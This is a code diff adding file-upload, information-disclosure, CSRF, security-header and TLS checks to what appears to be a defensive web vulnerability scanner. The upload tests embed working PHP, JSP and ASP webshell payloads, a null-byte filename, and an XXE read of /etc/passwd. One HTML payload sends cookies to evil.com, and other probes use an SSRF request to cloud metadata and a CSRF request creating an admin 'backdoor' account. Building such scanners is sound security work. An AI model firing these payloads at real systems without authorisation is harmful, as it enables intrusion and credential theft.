@@ -22,6 +22,7 @@ from .payloads import PayloadDatabase
 logger = get_logger(__name__)
 
 
+
 class ScannerEngine:
     """Production vulnerability scanning engine"""
 
@@ -762,3 +763,840 @@ class ScannerEngine:
             ))
 
         return results
+    # ------------------------------------------------------------------
+    # File Upload Security
+    # Uses real multipart/form-data uploads via aiohttp FormData.
+    # Tests: webshells, double extensions, MIME spoofing, null bytes,
+    # archive bombs, SVG XSS, oversized files.
+    # ------------------------------------------------------------------
+
+    async def _test_file_upload(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
+        results = []
+
+        upload_cases = [
+            # (description, filename, content_type, content_bytes, severity_if_accepted)
+            ("PHP Webshell", "shell.php",
+             "application/x-php", b"<?php system($_GET['cmd']); ?>",
+             VulnerabilityLevel.CRITICAL),
+            ("PHP5 Webshell", "shell.php5",
+             "application/x-php", b"<?php passthru($_POST['c']); ?>",
+             VulnerabilityLevel.CRITICAL),
+            ("PHP Disguised as JPEG", "image.php.jpg",
+             "image/jpeg", b"<?php echo shell_exec($_GET['e'].' 2>&1'); ?>",
+             VulnerabilityLevel.CRITICAL),
+            ("JSP Webshell", "shell.jsp",
+             "application/octet-stream",
+             b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+             VulnerabilityLevel.CRITICAL),
+            ("ASP Webshell", "shell.asp",
+             "application/octet-stream",
+             b"<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request(\"c\")).StdOut.ReadAll()) %>",
+             VulnerabilityLevel.CRITICAL),
+            ("SVG with XSS", "xss.svg",
+             "image/svg+xml",
+             b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.cookie)</script></svg>",
+             VulnerabilityLevel.HIGH),
+            ("HTML File Upload", "page.html",
+             "text/html",
+             b"<html><script>fetch('https://evil.com?c='+document.cookie)</script></html>",
+             VulnerabilityLevel.HIGH),
+            ("Double Extension .jpg.php", "file.jpg.php",
+             "image/jpeg", b"<?php phpinfo(); ?>",
+             VulnerabilityLevel.CRITICAL),
+            ("Null Byte Injection", "file.php\x00.jpg",
+             "image/jpeg", b"<?php system('id'); ?>",
+             VulnerabilityLevel.CRITICAL),
+            ("JPEG with PHP payload", "legit.jpg",
+             "image/jpeg",
+             b"\xff\xd8\xff\xe0" + b"<?php system($_GET['cmd']); ?>",
+             VulnerabilityLevel.HIGH),
+            ("XML External Entity file", "xxe.xml",
+             "application/xml",
+             b"<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>",
+             VulnerabilityLevel.HIGH),
+            ("ZIP Bomb (simulated)", "bomb.zip",
+             "application/zip",
+             b"PK\x03\x04" + b"\x00" * 100,  # minimal ZIP header
+             VulnerabilityLevel.MEDIUM),
+        ]
+
+        upload_endpoints = [
+            ("/api/upload/", "file"),
+            ("/api/files/upload/", "file"),
+            ("/upload/", "upload"),
+            ("/api/media/", "media"),
+            ("/api/attachments/", "attachment"),
+        ]
+
+        async with SecurityHTTPClient(config) as client:
+            for endpoint, file_field in upload_endpoints:
+                for description, filename, content_type, content, severity in upload_cases:
+                    test_id = f"{scan_id}-upload-{hash(description + endpoint)}"
+                    resp = None
+                    elapsed = 0.0
+                    t0 = time.time()
+                    try:
+                        resp = await client.post_multipart(
+                            endpoint,
+                            fields={},
+                            file_field=file_field,
+                            filename=filename,
+                            file_content=content,
+                            content_type=content_type,
+                        )
+                        elapsed = time.time() - t0
+                        code = getattr(resp, "status", 0)
+                        body = getattr(resp, "text_content", "").lower()
+
+                        if code in (400, 403, 415, 422, 413):
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"Malicious upload correctly rejected ({code}): {description}"
+                        elif code == 404:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"Upload endpoint not present: {endpoint}"
+                        elif code in (200, 201):
+                            upload_accepted = any(k in body for k in [
+                                "url", "path", "uploaded", "success", "filename",
+                                "file_id", "id", "location",
+                            ])
+                            if upload_accepted:
+                                status = TestStatus.VULNERABLE
+                                level = severity
+                                details = f"Malicious file accepted at {endpoint}: {description} — upload confirmed in response"
+                            else:
+                                status = TestStatus.PASSED
+                                level = None
+                                details = f"200 returned but no upload confirmation detected: {description}"
+                        else:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"Upload returned {code} for: {description}"
+
+                    except Exception as e:
+                        status, level, details = TestStatus.ERROR, None, str(e)
+
+                    results.append(TestResult(
+                        id=test_id,
+                        category="File Upload Security",
+                        test_name=f"{description} → {endpoint}",
+                        status=status,
+                        vulnerability_level=level,
+                        target_url=urljoin(config.target_url, endpoint),
+                        method="POST",
+                        payload=f"filename={filename}, content_type={content_type}",
+                        response_code=getattr(resp, "status", None),
+                        response_time=elapsed,
+                        service_name="scanner",
+                        details=details,
+                        recommendations="Validate file type by magic bytes not extension; store uploads outside webroot; scan with AV; restrict execution permissions",
+                    ))
+                    await asyncio.sleep(config.delay)
+
+        return results
+
+    # ------------------------------------------------------------------
+    # Information Disclosure
+    # Probes for exposed files, stack traces, server banners,
+    # directory listings, and debug endpoints.
+    # ------------------------------------------------------------------
+
+    async def _test_info_disclosure(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
+        results = []
+
+        disclosure_checks = [
+            # (description, endpoint, method, content_patterns, header_check, severity)
+            ("Environment File", "/.env", "GET",
+             ["db_password", "secret_key", "api_key", "database_url", "aws_secret_access_key",
+              "redis_url", "jwt_secret", "private_key"],
+             False, VulnerabilityLevel.CRITICAL),
+            ("Git Config Exposure", "/.git/config", "GET",
+             ["[core]", "repositoryformatversion", "url =", "[remote"],
+             False, VulnerabilityLevel.HIGH),
+            ("Git HEAD Exposure", "/.git/HEAD", "GET",
+             ["ref: refs/", "commit"],
+             False, VulnerabilityLevel.HIGH),
+            ("Backup SQL Dump", "/backup.sql", "GET",
+             ["insert into", "create table", "drop table", "grant all"],
+             False, VulnerabilityLevel.CRITICAL),
+            ("Backup Archive", "/backup.tar.gz", "GET",
+             [], False, VulnerabilityLevel.HIGH),
+            ("Config JSON", "/config.json", "GET",
+             ["password", "secret", "key", "token", "database", "host"],
+             False, VulnerabilityLevel.HIGH),
+            ("App Config", "/app.config", "GET",
+             ["connectionstring", "password", "secret"],
+             False, VulnerabilityLevel.HIGH),
+            ("Web Config", "/web.config", "GET",
+             ["connectionstring", "password", "appsettings"],
+             False, VulnerabilityLevel.HIGH),
+            ("phpinfo Page", "/phpinfo.php", "GET",
+             ["php version", "system", "build date", "configure command", "loaded configuration"],
+             False, VulnerabilityLevel.MEDIUM),
+            ("Server Error Stack Trace", "/api/trigger-error/", "GET",
+             ["traceback", "exception", "stack trace", "at line", "file \"", "syntaxerror",
+              "nameerror", "typeerror", "valueerror"],
+             False, VulnerabilityLevel.MEDIUM),
+            ("Debug Endpoint", "/api/debug/", "GET",
+             ["debug", "settings", "config", "environment", "sys.path", "installed_apps"],
+             False, VulnerabilityLevel.HIGH),
+            ("Django Debug Page", "/api/nonexistent-url-trigger-404/", "GET",
+             ["you're seeing this error because you have debug=true",
+              "django tried these url patterns",
+              "request information"],
+             False, VulnerabilityLevel.HIGH),
+            ("Server Version Banner", "/", "GET",
+             [], True, VulnerabilityLevel.LOW),
+            ("Directory Listing", "/static/", "GET",
+             ["index of /", "parent directory", "<a href=\"../\""],
+             False, VulnerabilityLevel.MEDIUM),
+            ("Swagger UI Exposed", "/docs", "GET",
+             ["swagger-ui", "openapi", "\"paths\":", "\"components\":"],
+             False, VulnerabilityLevel.LOW),
+            ("Actuator Endpoints", "/actuator/env", "GET",
+             ["propertysources", "systemproperties", "systemenv"],
+             False, VulnerabilityLevel.HIGH),
+            ("Actuator Health", "/actuator/health", "GET",
+             ["diskspace", "db", "redis", "status"],
+             False, VulnerabilityLevel.LOW),
+            ("AWS Metadata via SSRF", "/api/fetch/?url=http://169.254.169.254/latest/meta-data/", "GET",
+             ["ami-id", "instance-id", "local-ipv4", "iam"],
+             False, VulnerabilityLevel.CRITICAL),
+        ]
+
+        async with SecurityHTTPClient(config) as client:
+            for description, endpoint, method, patterns, check_headers, severity in disclosure_checks:
+                test_id = f"{scan_id}-info-{hash(description)}"
+                resp = None
+                elapsed = 0.0
+                t0 = time.time()
+                try:
+                    resp = await client.make_async_request(method, endpoint)
+                    elapsed = time.time() - t0
+                    code = getattr(resp, "status", 0)
+                    body = getattr(resp, "text_content", "")
+                    body_lower = body.lower()
+                    headers = getattr(resp, "headers", {})
+
+                    if check_headers:
+                        # Server version banner check
+                        server = headers.get("server", "").lower()
+                        x_powered = headers.get("x-powered-by", "").lower()
+                        leaked = []
+                        for val, label in [(server, "Server"), (x_powered, "X-Powered-By")]:
+                            if val and any(v in val for v in [
+                                "apache/", "nginx/", "iis/", "php/", "express/",
+                                "tomcat/", "jetty/", "gunicorn/", "werkzeug/",
+                            ]):
+                                leaked.append(f"{label}: {val}")
+                        if leaked:
+                            status = TestStatus.VULNERABLE
+                            level = severity
+                            details = f"Version info leaked in response headers: {'; '.join(leaked)}"
+                        else:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = "No version info leaked in response headers"
+
+                    elif code in (401, 403, 404):
+                        status = TestStatus.PASSED
+                        level = None
+                        details = f"Endpoint properly protected ({code}): {description}"
+
+                    elif code == 200 and patterns:
+                        found = [p for p in patterns if p in body_lower]
+                        if found:
+                            status = TestStatus.VULNERABLE
+                            level = severity
+                            details = f"Sensitive content exposed at {endpoint} — matched: {found[:5]}"
+                        else:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"Endpoint accessible but no sensitive patterns matched: {description}"
+
+                    elif code == 200 and not patterns:
+                        # Binary/archive endpoint — accessible is itself a finding
+                        status = TestStatus.VULNERABLE
+                        level = severity
+                        details = f"Sensitive file accessible at {endpoint} ({len(body)} bytes)"
+
+                    else:
+                        status = TestStatus.PASSED
+                        level = None
+                        details = f"No disclosure detected at {endpoint} ({code})"
+
+                except Exception as e:
+                    status, level, details = TestStatus.ERROR, None, str(e)
+
+                results.append(TestResult(
+                    id=test_id,
+                    category="Information Disclosure",
+                    test_name=description,
+                    status=status,
+                    vulnerability_level=level,
+                    target_url=urljoin(config.target_url, endpoint),
+                    method=method,
+                    response_code=getattr(resp, "status", None),
+                    response_time=elapsed,
+                    service_name="scanner",
+                    details=details,
+                    recommendations="Disable debug mode in production; restrict access to config/backup files; suppress server version headers; implement proper error pages",
+                ))
+                await asyncio.sleep(config.delay)
+
+        return results
+
+    # ------------------------------------------------------------------
+    # CSRF Protection
+    # Sends state-changing requests with cross-origin headers and
+    # invalid/missing CSRF tokens. Confirms protection is enforced.
+    # ------------------------------------------------------------------
+
+    async def _test_csrf_protection(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
+        results = []
+
+        csrf_targets = [
+            ("/api/users/profile/", "POST",
+             {"name": "csrf_attacker", "email": "attacker@evil.com"}),
+            ("/api/auth/password/change/", "POST",
+             {"old_password": "anything", "new_password": "hacked123"}),
+            ("/api/settings/", "PUT",
+             {"notification_email": "attacker@evil.com"}),
+            ("/api/users/delete/", "DELETE", None),
+            ("/api/auth/logout/", "POST", {}),
+            ("/api/admin/users/", "POST",
+             {"username": "backdoor", "role": "admin", "password": "hacked"}),
+        ]
+
+        # Test matrix: (token_scenario, headers_to_send)
+        token_scenarios = [
+            ("No CSRF Token", {
+                "Origin": "https://evil.com",
+                "Referer": "https://evil.com/attack.html",
+            }),
+            ("Invalid CSRF Token", {
+                "Origin": "https://evil.com",
+                "Referer": "https://evil.com/attack.html",
+                "X-CSRFToken": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+                "X-XSRF-TOKEN": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+            }),
+            ("Empty CSRF Token", {
+                "Origin": "https://evil.com",
+                "Referer": "https://evil.com/attack.html",
+                "X-CSRFToken": "",
+            }),
+            ("Cross-Origin No Referer", {
+                "Origin": "https://evil.com",
+            }),
+        ]
+
+        async with SecurityHTTPClient(config) as client:
+            for endpoint, method, json_body in csrf_targets:
+                for scenario_name, extra_headers in token_scenarios:
+                    test_id = f"{scan_id}-csrf-{hash(endpoint + method + scenario_name)}"
+                    resp = None
+                    elapsed = 0.0
+                    t0 = time.time()
+                    try:
+                        resp = await client.make_async_request(
+                            method, endpoint,
+                            json_body=json_body,
+                            headers=extra_headers,
+                            inject_as="json" if json_body else "query",
+                        )
+                        elapsed = time.time() - t0
+                        code = getattr(resp, "status", 0)
+                        body = getattr(resp, "text_content", "").lower()
+
+                        csrf_blocked = (
+                            code in (400, 403)
+                            or "csrf" in body
+                            or "forbidden" in body
+                            or "invalid token" in body
+                            or "token mismatch" in body
+                            or "origin not allowed" in body
+                        )
+
+                        if csrf_blocked:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"CSRF protection active ({code}) — {scenario_name} on {method} {endpoint}"
+                        elif code == 404:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"Endpoint not found: {endpoint}"
+                        elif code == 401:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"Authentication required before CSRF check: {endpoint}"
+                        elif code in (200, 201, 204):
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.HIGH
+                            details = (
+                                f"CSRF protection missing — {scenario_name} accepted on "
+                                f"{method} {endpoint} ({code})"
+                            )
+                        else:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"Response {code} for {scenario_name} on {method} {endpoint}"
+
+                    except Exception as e:
+                        status, level, details = TestStatus.ERROR, None, str(e)
+
+                    results.append(TestResult(
+                        id=test_id,
+                        category="CSRF Protection",
+                        test_name=f"{scenario_name} — {method} {endpoint}",
+                        status=status,
+                        vulnerability_level=level,
+                        target_url=urljoin(config.target_url, endpoint),
+                        method=method,
+                        payload=scenario_name,
+                        response_code=getattr(resp, "status", None),
+                        response_time=elapsed,
+                        service_name="scanner",
+                        details=details,
+                        recommendations="Use SameSite=Strict cookies; validate CSRF tokens server-side; check Origin/Referer headers; use double-submit cookie pattern",
+                    ))
+                    await asyncio.sleep(config.delay)
+
+        return results
+
+    # ------------------------------------------------------------------
+    # Security Headers
+    # Checks all OWASP-recommended headers with value validation.
+    # ------------------------------------------------------------------
+
+    async def _test_security_headers(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
+        results = []
+
+        async with SecurityHTTPClient(config) as client:
+            try:
+                resp = await client.make_async_request("GET", "/")
+                headers = getattr(resp, "headers", {})
+                # Normalise to lowercase keys
+                h = {k.lower(): v for k, v in headers.items()}
+            except Exception as e:
+                results.append(TestResult(
+                    id=f"{scan_id}-headers-fetch",
+                    category="Security Headers",
+                    test_name="Fetch Headers",
+                    status=TestStatus.ERROR,
+                    target_url=config.target_url,
+                    method="GET",
+                    service_name="scanner",
+                    details=str(e),
+                ))
+                return results
+
+        header_checks = [
+            # (test_name, header_key, required_values_any, forbidden_values, severity, recommendation)
+            ("X-Content-Type-Options", "x-content-type-options",
+             ["nosniff"], [],
+             VulnerabilityLevel.MEDIUM,
+             "Set X-Content-Type-Options: nosniff to prevent MIME sniffing"),
+            ("X-Frame-Options", "x-frame-options",
+             ["deny", "sameorigin"], [],
+             VulnerabilityLevel.MEDIUM,
+             "Set X-Frame-Options: DENY or SAMEORIGIN to prevent clickjacking"),
+            ("Strict-Transport-Security", "strict-transport-security",
+             ["max-age="], ["max-age=0"],
+             VulnerabilityLevel.HIGH,
+             "Set HSTS with max-age >= 31536000; include subdomains; consider preload"),
+            ("Content-Security-Policy", "content-security-policy",
+             ["default-src", "script-src"], ["unsafe-inline", "unsafe-eval"],
+             VulnerabilityLevel.HIGH,
+             "Implement a strict CSP; avoid unsafe-inline and unsafe-eval"),
+            ("Referrer-Policy", "referrer-policy",
+             ["no-referrer", "strict-origin", "same-origin"], [],
+             VulnerabilityLevel.LOW,
+             "Set Referrer-Policy to no-referrer or strict-origin-when-cross-origin"),
+            ("Permissions-Policy", "permissions-policy",
+             ["camera=", "microphone=", "geolocation="], [],
+             VulnerabilityLevel.LOW,
+             "Set Permissions-Policy to restrict browser feature access"),
+            ("X-XSS-Protection", "x-xss-protection",
+             ["1; mode=block", "0"], [],
+             VulnerabilityLevel.LOW,
+             "Set X-XSS-Protection: 1; mode=block (or 0 if CSP is in place)"),
+            ("Cache-Control on Auth", "cache-control",
+             ["no-store", "no-cache"], [],
+             VulnerabilityLevel.MEDIUM,
+             "Set Cache-Control: no-store on authenticated responses"),
+        ]
+
+        for test_name, header_key, required_any, forbidden, severity, recommendation in header_checks:
+            test_id = f"{scan_id}-hdr-{hash(header_key)}"
+            value = h.get(header_key, "")
+
+            if not value:
+                status = TestStatus.VULNERABLE
+                level = severity
+                details = f"Header '{header_key}' is missing"
+            elif forbidden and any(f in value.lower() for f in forbidden):
+                status = TestStatus.VULNERABLE
+                level = severity
+                details = f"Header '{header_key}' has insecure value: {value}"
+            elif required_any and not any(r in value.lower() for r in required_any):
+                status = TestStatus.VULNERABLE
+                level = severity
+                details = f"Header '{header_key}' present but value is weak: {value}"
+            else:
+                status = TestStatus.PASSED
+                level = None
+                details = f"Header '{header_key}' correctly set: {value}"
+
+            results.append(TestResult(
+                id=test_id,
+                category="Security Headers",
+                test_name=test_name,
+                status=status,
+                vulnerability_level=level,
+                target_url=config.target_url,
+                method="GET",
+                service_name="scanner",
+                details=details,
+                recommendations=recommendation,
+            ))
+
+        # Check for dangerous headers that should NOT be present
+        dangerous_present = [
+            ("X-Powered-By", "x-powered-by",
+             "Reveals technology stack — remove this header"),
+            ("Server Version", "server",
+             "Server header reveals version info — suppress or genericise"),
+            ("X-AspNet-Version", "x-aspnet-version",
+             "Reveals ASP.NET version — remove this header"),
+            ("X-AspNetMvc-Version", "x-aspnetmvc-version",
+             "Reveals ASP.NET MVC version — remove this header"),
+        ]
+        for test_name, header_key, recommendation in dangerous_present:
+            test_id = f"{scan_id}-hdr-leak-{hash(header_key)}"
+            value = h.get(header_key, "")
+            if value:
+                status = TestStatus.VULNERABLE
+                level = VulnerabilityLevel.LOW
+                details = f"Information-leaking header present: {header_key}: {value}"
+            else:
+                status = TestStatus.PASSED
+                level = None
+                details = f"Header '{header_key}' not present (good)"
+
+            results.append(TestResult(
+                id=test_id,
+                category="Security Headers",
+                test_name=test_name,
+                status=status,
+                vulnerability_level=level,
+                target_url=config.target_url,
+                method="GET",
+                service_name="scanner",
+                details=details,
+                recommendations=recommendation,
+            ))
+
+        return results
+
+    # ------------------------------------------------------------------
+    # SSL/TLS Security
+    # Real socket-level protocol negotiation + certificate inspection.
+    # Tests: weak protocols, weak ciphers, cert validity, HSTS, mixed content.
+    # ------------------------------------------------------------------
+
+    async def _test_ssl_tls(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
+        results = []
+        parsed = urlparse(config.target_url)
+        host = parsed.hostname
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+
+        if parsed.scheme != "https":
+            results.append(TestResult(
+                id=f"{scan_id}-ssl-no-https",
+                category="SSL/TLS Security",
+                test_name="HTTPS Not Used",
+                status=TestStatus.VULNERABLE,
+                vulnerability_level=VulnerabilityLevel.HIGH,
+                target_url=config.target_url,
+                method="N/A",
+                service_name="scanner",
+                details="Target is not using HTTPS — all traffic transmitted in plaintext",
+                recommendations="Enforce HTTPS site-wide; redirect all HTTP to HTTPS; obtain a valid TLS certificate",
+            ))
+            return results
+
+        loop = asyncio.get_event_loop()
+
+        # --- 1. Weak protocol negotiation ---
+        weak_proto_tests = [
+            ("TLSv1.0", ssl.TLSVersion.TLSv1),
+            ("TLSv1.1", ssl.TLSVersion.TLSv1_1),
+        ]
+        for proto_name, max_ver in weak_proto_tests:
+            test_id = f"{scan_id}-ssl-proto-{proto_name.lower().replace('.', '')}"
+            try:
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                ctx.maximum_version = max_ver
+                connected = await loop.run_in_executor(
+                    None, lambda c=ctx: _ssl_connect(host, port, c)
+                )
+                if connected:
+                    status = TestStatus.VULNERABLE
+                    level = VulnerabilityLevel.HIGH
+                    details = f"Deprecated protocol {proto_name} accepted — POODLE/BEAST attacks possible"
+                else:
+                    status = TestStatus.PASSED
+                    level = None
+                    details = f"Deprecated protocol {proto_name} correctly rejected"
+            except Exception as e:
+                status = TestStatus.PASSED
+                level = None
+                details = f"Protocol {proto_name} not negotiable: {e}"
+
+            results.append(TestResult(
+                id=test_id,
+                category="SSL/TLS Security",
+                test_name=f"Weak Protocol {proto_name}",
+                status=status,
+                vulnerability_level=level,
+                target_url=config.target_url,
+                method="N/A",
+                service_name="scanner",
+                details=details,
+                recommendations=f"Disable {proto_name}; support only TLS 1.2 and TLS 1.3",
+            ))
+
+        # --- 2. Weak cipher suites ---
+        weak_ciphers = [
+            "RC4-SHA", "RC4-MD5", "DES-CBC3-SHA", "EXP-RC4-MD5",
+            "NULL-SHA", "NULL-MD5", "ADH-AES256-SHA",
+        ]
+        test_id = f"{scan_id}-ssl-ciphers"
+        try:
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            ctx.set_ciphers(":".join(weak_ciphers))
+            connected = await loop.run_in_executor(
+                None, lambda: _ssl_connect(host, port, ctx)
+            )
+            if connected:
+                status = TestStatus.VULNERABLE
+                level = VulnerabilityLevel.HIGH
+                details = "Server accepts weak cipher suites (RC4/DES/NULL/EXPORT)"
+            else:
+                status = TestStatus.PASSED
+                level = None
+                details = "Weak cipher suites correctly rejected"
+        except ssl.SSLError:
+            status = TestStatus.PASSED
+            level = None
+            details = "Weak cipher suites not supported (good)"
+        except Exception as e:
+            status = TestStatus.ERROR
+            level = None
+            details = f"Cipher test failed: {e}"
+
+        results.append(TestResult(
+            id=test_id,
+            category="SSL/TLS Security",
+            test_name="Weak Cipher Suites",
+            status=status,
+            vulnerability_level=level,
+            target_url=config.target_url,
+            method="N/A",
+            service_name="scanner",
+            details=details,
+            recommendations="Disable RC4, DES, NULL, and EXPORT cipher suites; prefer ECDHE+AES-GCM",
+        ))
+
+        # --- 3. Certificate validity, expiry, self-signed ---
+        cert_test_id = f"{scan_id}-ssl-cert"
+        try:
+            ctx = ssl.create_default_context()
+            cert_info = await loop.run_in_executor(
+                None, lambda: _get_cert_info(host, port, ctx)
+            )
+            if cert_info.get("expired"):
+                status = TestStatus.VULNERABLE
+                level = VulnerabilityLevel.CRITICAL
+                details = f"SSL certificate has expired: {cert_info.get('not_after')}"
+            elif cert_info.get("self_signed"):
+                status = TestStatus.VULNERABLE
+                level = VulnerabilityLevel.HIGH
+                details = f"Self-signed certificate detected (issuer == subject: {cert_info.get('subject_cn')})"
+            elif cert_info.get("expiring_soon"):
+                days = cert_info.get("days_remaining", 0)
+                status = TestStatus.VULNERABLE
+                level = VulnerabilityLevel.MEDIUM
+                details = f"Certificate expiring in {days} days: {cert_info.get('not_after')}"
+            else:
+                status = TestStatus.PASSED
+                level = None
+                details = f"Certificate valid — expires {cert_info.get('not_after')} ({cert_info.get('days_remaining')} days)"
+        except ssl.SSLCertVerificationError as e:
+            status = TestStatus.VULNERABLE
+            level = VulnerabilityLevel.HIGH
+            details = f"Certificate verification failed: {e}"
+        except Exception as e:
+            status = TestStatus.ERROR
+            level = None
+            details = f"Certificate check failed: {e}"
+
+        results.append(TestResult(
+            id=cert_test_id,
+            category="SSL/TLS Security",
+            test_name="Certificate Validity",
+            status=status,
+            vulnerability_level=level,
+            target_url=config.target_url,
+            method="N/A",
+            service_name="scanner",
+            details=details,
+            recommendations="Use a CA-signed certificate; automate renewal with Let's Encrypt; monitor expiry",
+        ))
+
+        # --- 4. HSTS header presence and strength ---
+        hsts_test_id = f"{scan_id}-ssl-hsts"
+        try:
+            async with SecurityHTTPClient(config) as client:
+                resp = await client.make_async_request("GET", "/")
+                h = {k.lower(): v for k, v in getattr(resp, "headers", {}).items()}
+                hsts = h.get("strict-transport-security", "")
+
+            if not hsts:
+                status = TestStatus.VULNERABLE
+                level = VulnerabilityLevel.MEDIUM
+                details = "HSTS header missing — HTTP downgrade attacks possible"
+            elif "max-age=0" in hsts:
+                status = TestStatus.VULNERABLE
+                level = VulnerabilityLevel.MEDIUM
+                details = "HSTS max-age=0 effectively disables HSTS"
+            else:
+                # Parse max-age value
+                import re
+                m = re.search(r"max-age=(\d+)", hsts)
+                max_age = int(m.group(1)) if m else 0
+                if max_age < 31536000:
+                    status = TestStatus.VULNERABLE
+                    level = VulnerabilityLevel.LOW
+                    details = f"HSTS max-age too short ({max_age}s) — recommend >= 31536000"
+                else:
+                    status = TestStatus.PASSED
+                    level = None
+                    details = f"HSTS properly configured: {hsts}"
+        except Exception as e:
+            status = TestStatus.ERROR
+            level = None
+            details = f"HSTS check failed: {e}"
+
+        results.append(TestResult(
+            id=hsts_test_id,
+            category="SSL/TLS Security",
+            test_name="HSTS Header",
+            status=status,
+            vulnerability_level=level,
+            target_url=config.target_url,
+            method="GET",
+            service_name="scanner",
+            details=details,
+            recommendations="Set HSTS max-age >= 31536000; add includeSubDomains; submit to HSTS preload list",
+        ))
+
+        # --- 5. HTTP to HTTPS redirect ---
+        redirect_test_id = f"{scan_id}-ssl-redirect"
+        http_url = config.target_url.replace("https://", "http://", 1)
+        try:
+            import aiohttp
+            timeout = aiohttp.ClientTimeout(total=10)
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                async with session.get(http_url, allow_redirects=False, ssl=False) as resp:
+                    code = resp.status
+                    location = resp.headers.get("location", "")
+            if code in (301, 302, 307, 308) and "https://" in location.lower():
+                status = TestStatus.PASSED
+                level = None
+                details = f"HTTP correctly redirects to HTTPS ({code} → {location})"
+            else:
+                status = TestStatus.VULNERABLE
+                level = VulnerabilityLevel.MEDIUM
+                details = f"HTTP does not redirect to HTTPS — response was {code}"
+        except Exception as e:
+            status = TestStatus.ERROR
+            level = None
+            details = f"HTTP redirect check failed: {e}"
+
+        results.append(TestResult(
+            id=redirect_test_id,
+            category="SSL/TLS Security",
+            test_name="HTTP to HTTPS Redirect",
+            status=status,
+            vulnerability_level=level,
+            target_url=http_url,
+            method="GET",
+            service_name="scanner",
+            details=details,
+            recommendations="Redirect all HTTP traffic to HTTPS with a 301 permanent redirect",
+        ))
+
+        return results
+
+
+# ------------------------------------------------------------------
+# SSL helper functions (blocking — run in executor)
+# ------------------------------------------------------------------
+
+def _ssl_connect(host: str, port: int, ctx: ssl.SSLContext) -> bool:
+    """Attempt TLS handshake; return True if successful."""
+    try:
+        with socket.create_connection((host, port), timeout=5) as sock:
+            with ctx.wrap_socket(sock, server_hostname=host):
+                return True
+    except Exception:
+        return False
+
+
+def _get_cert_info(host: str, port: int, ctx: ssl.SSLContext) -> dict:
+    """Return certificate metadata dict."""
+    with socket.create_connection((host, port), timeout=5) as sock:
+        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
+            cert = ssock.getpeercert()
+
+    not_after_str = cert.get("notAfter", "")
+    not_after = (
+        datetime.datetime.strptime(not_after_str, "%b %d %H:%M:%S %Y %Z")
+        if not_after_str else None
+    )
+    now = datetime.datetime.utcnow()
+    days_remaining = (not_after - now).days if not_after else None
+
+    issuer = dict(x[0] for x in cert.get("issuer", []))
+    subject = dict(x[0] for x in cert.get("subject", []))
+
+    return {
+        "not_after": not_after_str,
+        "expired": not_after is not None and not_after < now,
+        "expiring_soon": days_remaining is not None and days_remaining < 30,
+        "days_remaining": days_remaining,
+        "self_signed": issuer.get("commonName") == subject.get("commonName"),
+        "subject_cn": subject.get("commonName"),
+        "issuer_cn": issuer.get("commonName"),
+    }
+
+
+# ------------------------------------------------------------------
+# Recommendation helpers
+# ------------------------------------------------------------------
+
+def _sqli_recommendation(level) -> Optional[str]:
+    if level is None:
+        return None
+    return (
+        "Use parameterised queries / prepared statements; "
+        "never concatenate user input into SQL; "
+        "apply least-privilege DB accounts; "
+        "enable WAF SQL injection rules"
+    )
